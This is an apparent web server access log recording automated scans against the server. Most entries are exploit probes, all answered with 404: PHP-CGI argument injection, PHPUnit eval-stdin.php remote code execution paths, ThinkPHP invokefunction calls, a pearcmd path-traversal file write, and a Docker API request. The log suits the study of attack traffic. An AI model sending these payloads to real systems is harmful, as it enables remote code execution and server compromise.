Server is running on port:  \\.\pipe\699e7cb1-c43a-4ca4-bcae-7f1434ff30df
[0mPOST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input [33m404[0m 72.201 ms - 151[0m
[0mGET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404[0m 17.178 ms - 189[0m
[0mGET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php [33m404[0m 4.635 ms - 185[0m
[0mGET /vendor/phpunit/src/Util/PHP/eval-stdin.php [33m404[0m 4.528 ms - 181[0m
[0mGET /vendor/phpunit/Util/PHP/eval-stdin.php [33m404[0m 4.881 ms - 177[0m
[0mGET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php [33m404[0m 4.148 ms - 184[0m
[0mGET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404[0m 4.117 ms - 196[0m
[0mGET /phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404[0m 4.348 ms - 182[0m
[0mGET /phpunit/phpunit/Util/PHP/eval-stdin.php [33m404[0m 4.552 ms - 178[0m
[0mGET /phpunit/src/Util/PHP/eval-stdin.php [33m404[0m 8.038 ms - 174[0m
[0mGET /phpunit/Util/PHP/eval-stdin.php [33m404[0m 4.198 ms - 170[0m
[0mGET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404[0m 3.866 ms - 186[0m
[0mGET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php [33m404[0m 3.795 ms - 182[0m
[0mGET /lib/phpunit/src/Util/PHP/eval-stdin.php [33m404[0m 3.730 ms - 178[0m
[0mGET /lib/phpunit/Util/PHP/eval-stdin.php [33m404[0m 3.643 ms - 174[0m
[0mGET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404[0m 3.512 ms - 193[0m
[0mGET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404[0m 3.400 ms - 197[0m
[0mGET /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404[0m 3.712 ms - 193[0m
[0mGET /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404[0m 3.078 ms - 192[0m
[0mGET /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404[0m 3.044 ms - 193[0m
[0mGET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404[0m 3.146 ms - 194[0m
[0mGET /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404[0m 3.095 ms - 195[0m
[0mGET /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404[0m 3.411 ms - 192[0m
[0mGET /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404[0m 3.491 ms - 195[0m
[0mGET /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404[0m 3.032 ms - 194[0m
[0mGET /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404[0m 2.902 ms - 197[0m
[0mGET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404[0m 2.955 ms - 193[0m
[0mGET /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404[0m 3.042 ms - 194[0m
[0mGET /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404[0m 2.926 ms - 193[0m
[0mGET /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404[0m 2.880 ms - 193[0m
[0mGET /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404[0m 9.529 ms - 195[0m
[0mGET /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404[0m 2.906 ms - 196[0m
[0mGET /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404[0m 2.833 ms - 194[0m
[0mGET /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404[0m 3.022 ms - 206[0m
[0mGET /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404[0m 2.837 ms - 195[0m
[0mGET /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404[0m 2.880 ms - 196[0m
[0mGET /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404[0m 2.818 ms - 194[0m
[0mGET /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404[0m 2.916 ms - 193[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello [33m404[0m 3.232 ms - 148[0m
[0mGET /public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello [33m404[0m 2.659 ms - 155[0m
[0mGET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5("hi"));?>+/tmp/index1.php [33m404[0m 2.631 ms - 148[0m
[0mGET /index.php?lang=../../../../../../../../tmp/index1 [33m404[0m 2.640 ms - 148[0m
[0mGET /containers/json [33m404[0m 2.929 ms - 154[0m
[0mGET / [32m200[0m 40.436 ms - 32369[0m
[0mGET / [32m200[0m 15.103 ms - 32369[0m
[0mGET / [32m200[0m 13.430 ms - 32369[0m
[0mGET / [32m200[0m 12.357 ms - 32369[0m
[0mGET / [32m200[0m 13.247 ms - 32369[0m
[0mGET / [32m200[0m 13.400 ms - 32369[0m
[0mGET / [32m200[0m 11.208 ms - 32369[0m
[0mGET / [32m200[0m 11.037 ms - 32369[0m
